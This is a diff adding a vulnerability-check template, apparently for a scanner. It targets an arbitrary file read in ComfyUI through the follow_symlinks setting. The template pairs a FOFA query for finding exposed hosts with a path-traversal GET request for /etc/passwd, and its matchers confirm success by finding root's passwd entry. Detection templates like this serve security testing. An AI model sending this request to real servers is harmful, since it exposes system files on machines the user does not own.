@@ -1,0 +1,25 @@
+## id: VEID-2024-0501
+## name: omfyUI follow_symlinks文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: omfyUI存在任意文件读取漏洞。
+## fofa-query: app="ComfyUI"
+## verification: true
+
+
+
+GET /../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/ && body contains "/root:/bin/bash" 
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 30b1684c1f29e76815c86ab3215c601968416240a300a42005f720d0d3de55ec
